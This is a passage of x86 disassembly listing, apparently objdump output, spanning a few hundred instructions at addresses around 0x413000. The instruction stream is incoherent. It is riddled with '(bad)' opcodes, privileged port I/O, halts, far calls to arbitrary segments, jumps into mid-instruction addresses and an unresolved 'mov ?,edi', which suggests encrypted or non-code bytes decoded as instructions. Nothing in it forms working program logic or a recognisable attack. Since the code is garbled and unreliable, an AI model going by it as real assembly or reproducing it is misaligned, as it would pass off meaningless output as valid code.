  412f48:	sbb    al,BYTE PTR [edx+esi*8+0x1da40c59]
  412f4f:	push   edi
  412f50:	icebp  
  412f51:	bound  edi,QWORD PTR [edi+0x3a6e5736]
  412f57:	mov    gs:0x3fef355c,al
  412f5d:	stos   BYTE PTR es:[edi],al
  412f5e:	in     al,0x5b
  412f60:	bswap  ebp
  412f62:	lock mov bl,0xb5
  412f65:	call   0x8aae:0x47d6ebb5
  412f6c:	shr    DWORD PTR [edx+ebx*4+0x4e],1
  412f70:	adc    DWORD PTR [edi+ebx*1],ebp
  412f73:	pop    ebx
  412f74:	or     ebx,esi
  412f76:	xor    eax,0x27d91dd0
  412f7b:	mov    dh,0xab
  412f7d:	clc    
  412f7e:	das    
  412f7f:	jmp    0xaf9fb299
  412f84:	add    BYTE PTR [ebx-0x2f],ch
  412f87:	dec    edx
  412f88:	lea    ebp,[esp+ebp*8-0x65372bbc]
  412f8f:	inc    ebp
  412f90:	mov    cl,0x30
  412f92:	sbb    al,0x30
  412f94:	cwde   
  412f95:	ins    DWORD PTR es:[edi],dx
  412f96:	add    DWORD PTR [ebx-0x66],edx
  412f99:	sbb    al,BYTE PTR [ebp+0x2c642694]
  412f9f:	jo     0x412fb1
  412fa1:	xchg   edx,eax
  412fa2:	daa    
  412fa3:	or     eax,0xa13491a5
  412fa8:	jecxz  0x412fa3
  412faa:	add    al,0xad
  412fac:	dec    ecx
  412fad:	mov    al,0x7d
  412faf:	or     esp,DWORD PTR [ebx-0x4e6e594d]
  412fb5:	add    al,ch
  412fb7:	inc    eax
  412fb8:	and    edi,DWORD PTR [edi-0x1]
  412fbb:	mov    al,ds:0x218c8869
  412fc0:	dec    ecx
  412fc1:	ins    DWORD PTR es:[edi],dx
  412fc2:	or     DWORD PTR [ecx-0x70365ea3],edx
  412fc8:	push   ds
  412fc9:	(bad)  
  412fca:	adc    eax,0x89973613
  412fcf:	push   ebp
  412fd0:	add    esp,DWORD PTR [eax+0x149cd52a]
  412fd6:	aas    
  412fd7:	jmp    FWORD PTR [edx+0x3d533a87]
  412fdd:	in     eax,0x38
  412fdf:	xchg   ebx,eax
  412fe0:	pop    edx
  412fe1:	out    0x31,eax
  412fe3:	push   edi
  412fe4:	pop    ecx
  412fe5:	jmp    0x41304a
  412fe7:	shr    BYTE PTR [esp+eiz*4+0x6e1fa5a0],cl
  412fee:	pop    ebp
  412fef:	sub    cl,ch
  412ff1:	add    DWORD PTR [esi+0x32],edx
  412ff4:	mov    ebx,0x4d79de3f
  412ff9:	or     DWORD PTR [edi],ebx
  412ffb:	push   edi
  412ffc:	stos   DWORD PTR es:[edi],eax
  412ffd:	push   edx
  412ffe:	and    al,0xb7
  413000:	(bad)  
  413001:	div    DWORD PTR [eax]
  413003:	inc    eax
  413004:	std    
  413005:	add    BYTE PTR [edx-0x58],dl
  413008:	or     DWORD PTR [ecx-0x42ae35f0],0x28cc8bb6
  413012:	xlat   BYTE PTR ds:[ebx]
  413013:	jle    0x413079
  413015:	and    BYTE PTR [ebx],bl
  413017:	lea    eax,[eax-0x4373835b]
  41301d:	cmp    BYTE PTR [eax+0x4c],ah
  413020:	cmp    eax,0x606e195f
  413025:	lods   al,BYTE PTR ds:[esi]
  413026:	in     eax,0x24
  413028:	sbb    ecx,DWORD PTR ds:0xfb7e05af
  41302e:	repnz xchg esi,eax
  413030:	not    dh
  413032:	mov    cl,0xfc
  413034:	mov    ebx,ebx
  413036:	pop    esp
  413037:	mov    dl,0xaf
  413039:	or     DWORD PTR [esi],ebx
  41303b:	jmp    0xc19a:0x1894ea1a
  413042:	outs   dx,BYTE PTR ds:[esi]
  413043:	jbe    0x413078
  413045:	in     eax,0xa6
  413047:	data16 or al,0x13
  41304a:	adc    ebx,esp
  41304c:	je     0x4130cc
  41304e:	mov    edx,0xcfc1eba7
  413053:	pushf  
  413054:	ins    BYTE PTR es:[edi],dx
  413055:	pop    ds
  413056:	ja     0x4130ba
  413058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413059:	jb     0x413022
  41305b:	mov    cl,0x7b
  41305d:	cmp    edx,0x21
  413060:	xor    al,0x5a
  413062:	push   ds
  413063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413064:	cmp    ch,dh
  413066:	sub    BYTE PTR [ebp+0x43c1c010],dh
  41306c:	in     eax,dx
  41306d:	xchg   ecx,eax
  41306e:	inc    ebp
  41306f:	adc    eax,0x4ca498a2
  413074:	sbb    eax,ecx
  413076:	cld    
  413077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413078:	addr16 adc eax,edi
  41307b:	(bad)  
  41307c:	lods   al,BYTE PTR ds:[esi]
  41307d:	jle    0x4130c0
  41307f:	mov    dl,0xdc
  413081:	xchg   DWORD PTR [esi+0x26],esp
  413084:	cmp    BYTE PTR gs:[edx-0x48469fe],cl
  41308b:	leave  
  41308c:	jg     0x4130a0
  41308e:	scas   eax,DWORD PTR es:[edi]
  41308f:	dec    eax
  413090:	mov    DWORD PTR [edi+0x668673e0],edi
  413096:	div    BYTE PTR [edi+0x6]
  413099:	mov    ebp,DWORD PTR [ebx]
  41309b:	imul   ebp,esp,0x73
  41309e:	nop
  41309f:	or     cl,cl
  4130a1:	gs mov esp,0x673b3a5c
  4130a7:	and    dh,BYTE PTR [eax+edx*1-0x1]
  4130ab:	idiv   BYTE PTR [eax+0x4bc25ff5]
  4130b1:	sbb    al,0x25
  4130b3:	dec    esi
  4130b4:	or     esi,DWORD PTR [edi]
  4130b6:	mov    esi,0x11687b2f
  4130bb:	shr    BYTE PTR [eax+0x44],1
  4130be:	out    dx,al
  4130bf:	push   eax
  4130c0:	cmp    ah,BYTE PTR [edx+eiz*4+0x3648bbd4]
  4130c7:	sbb    eax,0x6c72a5b
  4130cc:	and    eax,DWORD PTR [ebx+0x52]
  4130cf:	push   0x36
  4130d1:	adc    al,0x5
  4130d3:	adc    esp,DWORD PTR [esi+0x34]
  4130d6:	das    
  4130d7:	fbld   TBYTE PTR [edx-0x76]
  4130da:	cmp    dh,BYTE PTR fs:[ebp+0x52]
  4130de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130df:	jle    0x41309d
  4130e1:	sti    
  4130e2:	retf   
  4130e3:	nop
  4130e4:	ret    
  4130e5:	xchg   DWORD PTR [edi*4-0x623a00ef],ecx
  4130ec:	es lahf 
  4130ee:	hlt    
  4130ef:	nop
  4130f0:	les    esi,FWORD PTR [ebx-0x3c]
  4130f3:	sub    al,BYTE PTR [eax+0x5aaa41de]
  4130f9:	cmpxchg BYTE PTR [edi-0x32],al
  4130fd:	ins    DWORD PTR es:[edi],dx
  4130fe:	add    eax,0xbe2b086e
  413103:	idiv   BYTE PTR [ebx-0x73cb562]
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	sub    al,0x3
  41310c:	or     ebp,ebp
  41310e:	mov    ah,BYTE PTR [edx-0x74a4f170]
  413114:	add    edi,DWORD PTR [ecx-0x33e2e079]
  41311a:	push   edi
  41311b:	dec    esi
  41311c:	xor    DWORD PTR [edi],edi
  41311e:	mov    ds:0x4135bcde,eax
  413123:	xor    al,0x47
  413125:	pop    eax
  413126:	(bad)  
  413127:	stos   DWORD PTR es:[edi],eax
  413128:	fnstcw WORD PTR [edi-0x7cac73c0]
  41312e:	adc    ah,BYTE PTR [ecx+0x46c51f9c]
  413134:	jb     0x413138
  413136:	add    esi,DWORD PTR [ebp+0x5bee1fd4]
  41313c:	ss pop es
  41313e:	push   ebp
  41313f:	stos   DWORD PTR es:[edi],eax
  413140:	mov    ebx,0xcab0f240
  413145:	adc    al,0xa7
  413147:	add    dh,BYTE PTR [ebx-0x35]
  41314a:	popa   
  41314b:	int    0xbb
  41314d:	or     ch,BYTE PTR [eax]
  41314f:	sbb    bh,ch
  413151:	adc    ch,cl
  413153:	int3   
  413154:	xor    bl,BYTE PTR [ecx+ebx*1]
  413157:	inc    ebp
  413158:	adc    eax,0x41de0ac9
  41315d:	adc    DWORD PTR [eax+edx*2+0x42],edi
  413161:	ror    BYTE PTR [edi],1
  413163:	adc    ah,BYTE PTR [ecx+0x51]
  413166:	rcr    BYTE PTR [edi-0x38],1
  413169:	in     eax,dx
  41316a:	pusha  
  41316b:	sbb    edi,DWORD PTR [edi+esi*1]
  41316e:	mov    bh,0x13
  413170:	mov    ah,bh
  413172:	stos   DWORD PTR es:[edi],eax
  413173:	in     al,dx
  413174:	leave  
  413175:	ss js  0x4131d1
  413178:	arpl   WORD PTR [ebx-0x8],dx
  41317b:	fcmovnbe st,st(1)
  41317d:	adc    DWORD PTR [edi+0x47],ecx
  413180:	sub    bl,dl
  413182:	mov    DWORD PTR [eax],esi
  413184:	or     BYTE PTR [esp+eax*8],cl
  413187:	std    
  413188:	das    
  413189:	fs jl  0x4131c7
  41318c:	outs   dx,BYTE PTR ds:[esi]
  41318d:	adc    DWORD PTR [ebp+0x12],edx
  413190:	loop   0x413164
  413192:	int    0x48
  413194:	sar    BYTE PTR [esi],cl
  413196:	inc    esi
  413197:	jg     0x4131d3
  413199:	dec    ebx
  41319a:	pop    edx
  41319b:	pusha  
  41319c:	xchg   esp,eax
  41319d:	push   cs
  41319e:	(bad)  
  41319f:	push   eax
  4131a0:	mov    ds:0xf5feedb3,eax
  4131a5:	outs   dx,DWORD PTR ds:[esi]
  4131a6:	fwait
  4131a7:	xor    ebx,DWORD PTR [ecx-0x74]
  4131aa:	icebp  
  4131ab:	test   eax,0xad563a0f
  4131b0:	mov    gs,ebx
  4131b2:	(bad)  [esi-0x28]
  4131b5:	les    eax,FWORD PTR [edi+ebx*8-0x35]
  4131b9:	daa    
  4131ba:	shl    BYTE PTR [eax+ebp*8+0x41],0x44
  4131bf:	push   eax
  4131c0:	sub    ebx,DWORD PTR [edx-0x2d3a7e39]
  4131c6:	xor    esp,0x77
  4131c9:	and    ebx,DWORD PTR [ebx-0x47a01636]
  4131cf:	popa   
  4131d0:	ins    DWORD PTR es:[edi],dx
  4131d1:	jne    0x4131c9
  4131d3:	jmp    0x413214
  4131d5:	and    DWORD PTR [eax+0x59d3f748],ebx
  4131db:	in     al,0x60
  4131dd:	pop    es
  4131de:	xchg   edx,eax
  4131df:	and    BYTE PTR [ebx],ch
  4131e1:	aam    0x63
  4131e3:	les    esi,FWORD PTR ss:[esi+edx*1+0x36]
  4131e8:	ins    BYTE PTR es:[edi],dx
  4131e9:	loope  0x4131bc
  4131eb:	inc    esi
  4131ec:	xchg   edx,eax
  4131ed:	pop    es
  4131ee:	sbb    al,0x65
  4131f0:	cmp    esi,eax
  4131f2:	push   edx
  4131f3:	cmc    
  4131f4:	in     al,dx
  4131f5:	jns    0x4131f5
  4131f7:	adc    BYTE PTR [edx+0x7118dd8d],bl
  4131fd:	fnstsw WORD PTR [edx+0x47]
  413200:	and    al,0x55
  413202:	ss xchg esp,eax
  413204:	and    al,0xd6
  413206:	or     DWORD PTR [eax],0xfffffffd
  413209:	outs   dx,DWORD PTR ds:[esi]
  41320a:	and    eax,DWORD PTR [edx+0x56523b7a]
  413210:	jg     0x4131be
  413212:	jl     0x41325e
  413214:	add    al,0x12
  413216:	retf   0x1239
  413219:	dec    ebp
  41321a:	or     DWORD PTR [esi+0x7a],ebp
  41321d:	stos   BYTE PTR es:[edi],al
  41321e:	mov    ebx,0x12095de6
  413223:	shl    BYTE PTR [eax],0x52
  413226:	or     ecx,eax
  413228:	and    edi,DWORD PTR [esp+ecx*4]
  41322b:	mov    ds:0xa59e45f6,al
  413230:	test   DWORD PTR [eax+0x39],0xc15dba66
  413237:	shl    edi,0x63
  41323a:	mov    eax,0x9125b76f
  41323f:	add    eax,edx
  413241:	xor    DWORD PTR [edi+0x6d],ecx
  413244:	adc    ah,BYTE PTR [ebp-0x9d495cc]
  41324a:	icebp  
  41324b:	hlt    
  41324c:	push   cs
  41324d:	or     DWORD PTR [ebx+0x6d0aa816],esp
  413253:	jl     0x41320c
  413255:	aad    0xe9
  413257:	sbb    al,0xa0
  413259:	xchg   ebx,eax
  41325a:	int3   
  41325b:	pop    ebp
  41325c:	push   0x8df225f3
  413261:	xor    DWORD PTR [esi],ebp
  413263:	dec    DWORD PTR [eax-0x53]
  413266:	xchg   ecx,eax
  413267:	aas    
  413268:	mov    ds:0x4d6720ac,eax
  41326d:	pushf  
  41326e:	into   
  41326f:	xchg   esi,eax
  413270:	push   edi
  413271:	mov    WORD PTR [edi],ss
  413273:	xor    eax,ebx
  413275:	sti    
  413276:	or     DWORD PTR [ecx],esi
  413278:	dec    ebp
  413279:	and    ebp,DWORD PTR [esi-0x20]
  41327c:	jmp    0x4132d0
  41327e:	clc    
  41327f:	sub    eax,0x47359543
  413284:	sub    eax,0xa2855dcc
  413289:	outs   dx,DWORD PTR ds:[esi]
  41328a:	and    eax,0x1ca8912c
  41328f:	fs aas 
  413291:	mov    bl,0xa2
  413293:	mov    edx,0x2234435b
  413298:	or     esi,DWORD PTR [eax+esi*8+0x12]
  41329c:	xchg   edi,eax
  41329d:	cs inc ebx
  41329f:	loope  0x4132b9
  4132a1:	and    eax,DWORD PTR [eax]
  4132a3:	cmp    ebx,ebp
  4132a5:	data16 cli 
  4132a7:	sub    al,0x2b
  4132a9:	leave  
  4132aa:	(bad)  
  4132ac:	mov    bl,0xe7
  4132ae:	scas   al,BYTE PTR es:[edi]
  4132af:	cli    
  4132b0:	aam    0xc2
  4132b2:	xor    bl,BYTE PTR [ecx-0x77]
  4132b5:	retf   
  4132b6:	hlt    
  4132b7:	mov    al,ds:0x20b0243
  4132bc:	shr    cl,0x8
  4132bf:	mov    dh,0x68
  4132c1:	aam    0xbf
  4132c3:	cs mov cl,0xa1
  4132c6:	mov    esp,0xd3c68028
  4132cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132cc:	jg     0x413314
  4132ce:	rol    esi,cl
  4132d0:	sbb    DWORD PTR [esi],0xffffffee
  4132d3:	inc    edi
  4132d4:	mov    ah,0xa
  4132d6:	lahf   
  4132d7:	lahf   
  4132d8:	mov    eax,ds:0x34ffce67
  4132dd:	(bad)  
  4132de:	pop    edi
  4132df:	iret   
  4132e0:	xchg   DWORD PTR [edi+edi*4+0x3a],ebp
  4132e4:	in     eax,0x8a
  4132e6:	retf   
  4132e7:	ins    DWORD PTR es:[edi],dx
  4132e8:	mov    bh,0xfd
  4132ea:	pop    ecx
  4132eb:	call   0x4281:0x5c8653cf
  4132f2:	loope  0x4132d3
  4132f4:	and    al,0x8a
  4132f6:	inc    ecx
  4132f7:	ror    BYTE PTR [edi+0x20a9b604],1
  4132fd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ff:	fs js  0x413283
  413302:	arpl   WORD PTR [eax-0x63],sp
  413305:	pop    es
  413306:	sbb    bl,BYTE PTR [edi-0x79]
  413309:	in     eax,0x6a
  41330b:	jmp    FWORD PTR [edi]
  41330d:	cld    
  41330e:	js     0x41335e
  413310:	adc    BYTE PTR [ebx-0x31],0x73
  413314:	stos   DWORD PTR es:[edi],eax
  413315:	xor    ah,BYTE PTR [ebx+0x7efaabbb]
  41331b:	neg    BYTE PTR [ecx-0x254c720a]
  413321:	or     dl,BYTE PTR [eax+0x6896b61f]
  413327:	lods   al,BYTE PTR ds:[esi]
  413328:	xchg   BYTE PTR [esi-0x4],al
  41332b:	leave  
  41332c:	enter  0xe77c,0x76
  413330:	jl     0x41335c
  413332:	lods   al,BYTE PTR ds:[esi]
  413333:	jge    0x4133a7
  413335:	pop    esi
  413336:	pop    ebx
  413337:	shl    edx,1
  413339:	add    esi,0xfe69a17e
  41333f:	xchg   DWORD PTR cs:[eax-0x45a5fe16],ecx
  413346:	and    DWORD PTR [ebp-0x7b],esp
  413349:	ins    DWORD PTR es:[edi],dx
  41334a:	repz sub bh,BYTE PTR [eax-0x7e97ce88]
  413351:	aaa    
  413352:	adc    BYTE PTR [edi],dl
  413354:	cmp    al,al
  413356:	lods   eax,DWORD PTR ds:[esi]
  413357:	push   eax
  413358:	or     DWORD PTR [edi+edx*4-0x42],esp
  41335c:	dec    eax
  41335d:	jmp    0x190a069f
  413362:	fwait
  413363:	xor    al,0x8c
  413365:	xchg   DWORD PTR [esi-0xf],edi
  413368:	pop    ebp
  413369:	jp     0x4133cf
  41336b:	or     al,0xf1
  41336d:	imul   ebp,DWORD PTR [esi-0x1309d9c5],0x2d488ca5
  413377:	imul   eax,DWORD PTR [ebp-0x80],0xffffff84
  41337b:	jl     0x41337d
  41337d:	sub    eax,0xd5dc045c
  413382:	std    
  413383:	repz repnz stc 
  413386:	mov    esi,0x4a7c374e
  41338b:	and    DWORD PTR [edi],0x1c
  41338e:	mov    ebx,0x8c85d035
  413393:	push   ecx
  413394:	shl    BYTE PTR [ebx+0x26],1
  413397:	xchg   edi,eax
  413398:	adc    eax,0x1e8cdda6
  41339d:	in     al,0xa5
  41339f:	arpl   WORD PTR [ecx+ebp*4+0x1b],cx
  4133a3:	(bad)  
  4133a4:	pop    edi
  4133a5:	jmp    0x6ca0:0x67c54516
  4133ac:	ret    
  4133ad:	dec    ebx
  4133ae:	pop    esp
  4133af:	hlt    
  4133b0:	ucomiss xmm0,DWORD PTR [ebx+0x24]
  4133b4:	mov    bh,0xa2
  4133b6:	sahf   
  4133b7:	and    edi,DWORD PTR [ebx]
  4133b9:	stc    
  4133ba:	and    edi,edi
  4133bc:	ins    BYTE PTR es:[edi],dx
  4133bd:	mov    ds:0xa31d2885,eax
  4133c2:	test   eax,0xa33b3e8e
  4133c7:	popa   
  4133c8:	xchg   BYTE PTR [edx+0x5df0b8db],cl
  4133ce:	mov    BYTE PTR [esi],dl
  4133d0:	les    ecx,FWORD PTR [eax+0x51]
  4133d3:	inc    ebx
  4133d4:	stos   DWORD PTR es:[edi],eax
  4133d5:	out    dx,eax
  4133d6:	mov    ds:0xe6dc6f41,al
  4133db:	les    esi,FWORD PTR [edi+0x5f483f2d]
  4133e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133e2:	xor    BYTE PTR [ebx],0xd1
  4133e5:	mov    ch,BYTE PTR [eax+edx*8]
  4133e8:	sbb    eax,0xd9cb4c52
  4133ed:	inc    ebp
  4133ee:	and    BYTE PTR [ebx+edx*4-0x5e54b4e9],ch
  4133f5:	pop    esp
  4133f6:	mov    ecx,0x35a925ac
  4133fb:	mov    ch,0xac
  4133fd:	out    0xa,eax
  4133ff:	pop    ecx
  413400:	iret   
  413401:	mov    al,0x84
  413403:	push   0x53
  413405:	ja     0x4133eb
  413407:	pushf  
  413408:	xor    dl,BYTE PTR [esi+0x76]
  41340b:	and    eax,0x132417f8
  413410:	nop
  413411:	jl     0x4133ce
  413413:	es aam 0x2b
  413416:	pop    esp
  413417:	in     al,dx
  413418:	mov    ds:0x15770e75,al
  41341d:	dec    ecx
  41341e:	pusha  
  41341f:	repnz mov edx,0xc3f3d9d9
  413425:	xchg   BYTE PTR ds:0xaece4bff,dl
  41342b:	push   0x9f912603
  413430:	cmc    
  413431:	adc    DWORD PTR [edx-0x1429f7d5],ecx
  413437:	lds    esp,FWORD PTR [ebx+ebx*2]
  41343a:	stc    
  41343b:	xor    BYTE PTR [edx+ebp*8+0x760cea70],cl
  413442:	fdiv   QWORD PTR [edi-0x55]
  413445:	ja     0x413466
  413447:	ror    BYTE PTR [edx+0x67],0xb9
  41344b:	inc    edx
  41344c:	mov    ecx,0xe336d533
  413451:	push   ecx
  413452:	xchg   edi,eax
  413453:	add    dl,BYTE PTR [ebp+ebp*4-0x719a8783]
  41345a:	push   ecx
  41345b:	pop    ebp
  41345c:	daa    
  41345d:	je     0x41341c
  41345f:	push   0x38e650d7
  413464:	mov    edx,DWORD PTR [ebx+0x2782ed5d]
  41346a:	mov    edx,0x70c2dce7
  41346f:	cmc    
  413470:	cwde   
  413471:	fisttp QWORD PTR fs:[edi]
  413474:	pop    es
  413475:	into   
  413476:	call   DWORD PTR [edx]
  413478:	xor    eax,edi
  41347a:	ds shr eax,1
  41347d:	inc    esi
  41347e:	sti    
  41347f:	jge    0x41347d
  413481:	push   edi
  413482:	fcmovnu st,st(5)
  413484:	test   ebx,ebp
  413486:	lahf   
  413487:	pop    ecx
  413488:	stos   DWORD PTR es:[edi],eax
  413489:	jge    0x413483
  41348b:	and    DWORD PTR [eiz*8+0x6bff8f7c],esi
  413492:	in     eax,dx
  413493:	mov    cl,0xf6
  413495:	mov    ecx,cs
  413497:	cmp    bl,cl
  413499:	pop    edx
  41349a:	push   edi
  41349b:	mov    ah,BYTE PTR [ebp+0x7f]
  41349e:	test   al,0x32
  4134a0:	fwait
  4134a1:	xor    ah,BYTE PTR [esi-0x7fdf6805]
  4134a7:	xlat   BYTE PTR ds:[ebx]
  4134a8:	jmp    0x2416:0x3b6dcdd2
  4134af:	imul   eax,ebp,0xffffff94
  4134b2:	cmp    DWORD PTR [eax],ecx
  4134b4:	jae    0x413515
  4134b6:	xor    DWORD PTR [ebx-0x5a9a0227],0x59
  4134bd:	hlt    
  4134be:	call   0x31b7:0xd45b7a06
  4134c5:	js     0x41347b
  4134c7:	add    al,0x50
  4134c9:	push   esp
  4134ca:	xor    al,0x37
  4134cc:	cmp    al,dh
  4134ce:	adc    edi,0x54
  4134d1:	pop    edi
  4134d2:	and    DWORD PTR [eax+0x3eb3434f],eax
  4134d8:	mov    al,0x4e
  4134da:	(bad)  
  4134db:	retf   
  4134dc:	xchg   ebp,eax
  4134dd:	push   cs
  4134de:	daa    
  4134df:	inc    edx
  4134e0:	fld    DWORD PTR ds:0x54104f62
  4134e6:	adc    DWORD PTR [eax],ebx
  4134e8:	adc    ecx,ebx
  4134ea:	sti    
  4134eb:	outs   dx,DWORD PTR ds:[esi]
  4134ec:	iret   
  4134ed:	retf   0x9bb
  4134f0:	aam    0xac
  4134f2:	sub    BYTE PTR [esi+0x1843c414],cl
  4134f8:	add    dl,BYTE PTR [ebp+eax*4+0x77]
  4134fc:	(bad)  
  4134fd:	js     0x4134ae
  4134ff:	mov    dh,0x9d
  413501:	sub    edx,DWORD PTR [esp+esi*2+0x5]
  413505:	lahf   
  413506:	sahf   
  413507:	test   eax,0xcbdfde99
  41350c:	adc    al,0x41
  41350e:	xchg   ecx,eax
  41350f:	cdq    
  413510:	jmp    0x41353b
  413512:	jmp    0x60e4:0x5cc78fa9
  413519:	mov    ah,0x49
  41351b:	int3   
  41351c:	fimul  DWORD PTR [eax+ecx*1+0x3eed03b1]
  413523:	sbb    DWORD PTR [edi],0x5f
  413526:	jb     0x4134d7
  413528:	ins    DWORD PTR es:[edi],dx
  413529:	push   cs
  41352a:	rol    bl,cl
  41352c:	or     al,BYTE PTR [esi-0x10d69cf8]
  413532:	dec    edi
  413533:	call   0xe62afaf5
  413538:	mov    dl,0x24
  41353a:	les    esp,FWORD PTR [edi+0x439734e5]
  413540:	fld    st(0)
  413542:	push   ds
  413543:	cmc    
  413544:	sub    DWORD PTR [edi-0x741c7987],eax
  41354a:	mov    al,0x5e
  41354c:	add    DWORD PTR [ebp+0x7f39cc06],edi
  413552:	or     DWORD PTR [ecx-0x3e12cb86],ecx
  413558:	or     eax,DWORD PTR [eax+0x173d3eaa]
  41355e:	or     eax,DWORD PTR [ebx]
  413560:	sub    esi,0xffffffe2
  413563:	mov    cl,0x51
  413565:	and    DWORD PTR [edx-0x36],esp
  413568:	in     al,0x65
  41356a:	retf   
  41356b:	adc    eax,0x22f912c1
  413570:	push   edx
  413571:	cld    
  413572:	inc    edx
  413573:	sub    eax,0x596ffbcd
  413578:	scas   eax,DWORD PTR es:[edi]
  413579:	ins    BYTE PTR es:[edi],dx
  41357a:	pop    ebx
  41357b:	inc    ecx
  41357c:	sbb    ebp,DWORD PTR [ebp+eax*1+0x4fec0353]
  413583:	inc    ebx
  413584:	dec    ecx
  413585:	mov    ch,0xf3
  413587:	mov    esi,0xe95d1b91
  41358c:	mov    edi,esi
  41358e:	jp     0x413573
  413590:	daa    
  413591:	iret   
  413592:	rcr    DWORD PTR [esi],0xcd
  413595:	arpl   WORD PTR [edx+0x5b],bx
  413598:	test   BYTE PTR [ebp+0x32],cl
  41359b:	aaa    
  41359c:	(bad)
  41359f:	cmp    eax,DWORD PTR [edi-0x4a]
  4135a2:	pop    edx
  4135a3:	dec    ebp
  4135a4:	popa   
  4135a5:	or     al,0xda
  4135a7:	mov    ebp,es
  4135a9:	loop   0x41361e
  4135ab:	scas   eax,DWORD PTR es:[edi]
  4135ac:	and    eax,0x58679e9d
  4135b1:	sbb    DWORD PTR [ecx-0x3896b26],edi
  4135b7:	and    bh,cl
  4135b9:	loopne 0x413547
  4135bb:	imul   ecx,esi,0xeae56104
  4135c1:	cmp    al,BYTE PTR [ecx+eiz*4+0x11]
  4135c5:	xor    BYTE PTR [ebx],ah
  4135c7:	sbb    eax,0x475fa89d
  4135cc:	es xor cl,ch
  4135cf:	nop
  4135d0:	(bad)  
  4135d1:	push   edx
  4135d2:	push   edi
  4135d3:	test   BYTE PTR [ebp+0x5c],al
  4135d6:	push   0xe2b3aa1c
  4135db:	mov    ebx,0xed6ffe9c
  4135e0:	mov    bl,0x5a
  4135e2:	out    dx,al
  4135e3:	imul   ebx,DWORD PTR [ebx-0x21b310b],0xdf72d3cb
  4135ed:	add    DWORD PTR [ebx],esp
  4135ef:	scas   al,BYTE PTR es:[edi]
  4135f0:	std    
  4135f1:	mov    ch,0xc7
  4135f3:	pusha  
  4135f4:	retf   
  4135f5:	pushf  
  4135f6:	dec    edx
  4135f7:	sub    cl,BYTE PTR [ebp-0x7bb32f2a]
  4135fd:	xchg   ebp,eax
  4135fe:	xchg   BYTE PTR [ebp+0x73],bl
  413601:	cs dec ebp
  413603:	fs hlt 
  413605:	out    dx,al
  413606:	in     al,dx
  413607:	jnp    0x41367c
  413609:	fimul  WORD PTR [eax]
  41360b:	daa    
  41360c:	js     0x4135ea
  41360e:	loop   0x4135a9
  413610:	and    DWORD PTR [ebp-0x2],esi
  413613:	cmc    
  413614:	aas    
  413615:	and    BYTE PTR [eax],cl
  413617:	cdq    
  413618:	dec    esp
  413619:	retf   
  41361a:	out    dx,eax
  41361b:	dec    ecx
  41361c:	xchg   edi,eax
  41361d:	xchg   ebp,eax
  41361e:	cmc    
  41361f:	dec    esi
  413620:	xchg   ecx,eax
  413621:	inc    ecx
  413622:	jle    0x41367c
  413624:	cmp    ch,ah
  413626:	jge    0x41368f
  413628:	xchg   edx,eax
  413629:	sahf   
  41362a:	ret    
  41362b:	daa    
  41362c:	imul   DWORD PTR [ecx]
  41362e:	arpl   di,di
  413630:	jno    0x4135b3
  413632:	jp     0x4136af
  413634:	adc    BYTE PTR [edi-0x4c],bh
  413637:	mov    dl,0xaf
  413639:	out    0xdd,eax
  41363b:	out    dx,al
  41363c:	mov    ebp,0xa3d08a99
  413641:	in     al,0xc8
  413643:	ja     0x413619
  413645:	(bad)  
  413646:	pop    edx
  413647:	mov    ?,edi
  413649:	gs sar bh,0x30
  41364d:	test   al,0xb4
  41364f:	jns    0x41360c
  413651:	add    al,0x5e
  413653:	pop    edi
  413654:	xchg   esp,eax
  413655:	test   eax,0x964429bd
  41365a:	mov    al,ds:0x97e0082a
  41365f:	(bad)  
  413660:	ret    0x4b90
  413663:	fldenv [ebp+0x6a]
  413666:	mov    edx,0xc4fc915c
  41366b:	loop   0x4136be
  41366d:	(bad)  
  41366e:	(bad)
  413673:	push   ss
  413674:	fcomi  st,st(6)
  413676:	sub    al,0x8a
  413678:	test   esp,edx
  41367a:	scas   al,BYTE PTR es:[edi]
  41367b:	jbe    0x413656
  41367d:	push   es
  41367e:	out    dx,al
  41367f:	dec    ecx
  413680:	fdiv   st,st(0)
  413682:	jmp    0x1e38c7ea
  413687:	fidiv  WORD PTR [ecx-0x57]
  41368a:	xlat   BYTE PTR ds:[ebx]
  41368b:	sbb    dl,BYTE PTR [edi]
  41368d:	xchg   ecx,eax
  41368e:	mov    bl,0x92
  413690:	and    BYTE PTR [ebp-0x18a73ac4],dl
  413696:	outs   dx,BYTE PTR ds:[esi]
  413697:	jno    0x4136b0
  413699:	cmp    ah,al
  41369b:	dec    edi
  41369c:	add    bh,BYTE PTR [edx-0x73e018d9]
  4136a2:	push   eax
  4136a3:	rcl    edx,cl
  4136a5:	test   BYTE PTR [esi],al
  4136a7:	sbb    ch,dl
  4136a9:	pop    ecx
  4136aa:	jge    0x4136a3
  4136ac:	cmp    ebx,DWORD PTR [edi+ebp*4+0x40]
  4136b0:	push   DWORD PTR [edx]
  4136b2:	call   0xccd3:0x7afe0220
  4136b9:	shl    BYTE PTR [edi],1
  4136bb:	sbb    BYTE PTR [ebx],dl
  4136bd:	inc    esi
  4136be:	sbb    BYTE PTR [edi-0x1ac50182],0x1b
  4136c5:	sbb    BYTE PTR [edi-0x60],al
  4136c8:	hlt    
  4136c9:	jo     0x41367c
  4136cb:	pop    es
  4136cc:	mov    dh,0x1b
  4136ce:	nop
  4136cf:	test   DWORD PTR [edi-0x4034c1],edi
  4136d5:	mov    bl,0x1
  4136d7:	iret   
  4136d8:	and    ebx,esi
  4136da:	jns    0x413758
  4136dc:	bound  ebp,QWORD PTR [esi+0x20]
  4136df:	adc    DWORD PTR [esi+eiz*1+0x64],edi
  4136e3:	adc    dl,BYTE PTR [esi+0x4d]
  4136e6:	mov    dh,0x1d
  4136e8:	dec    ecx
  4136e9:	lods   eax,DWORD PTR ds:[esi]
  4136ea:	or     al,0x1d
  4136ec:	retf   
  4136ed:	add    eax,DWORD PTR ds:0x9f8ae856
  4136f3:	ret    
  4136f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f5:	(bad)  
  4136f6:	jle    0x413692
  4136f8:	and    BYTE PTR [ebp+0x5436c33b],dh
  4136fe:	dec    esi
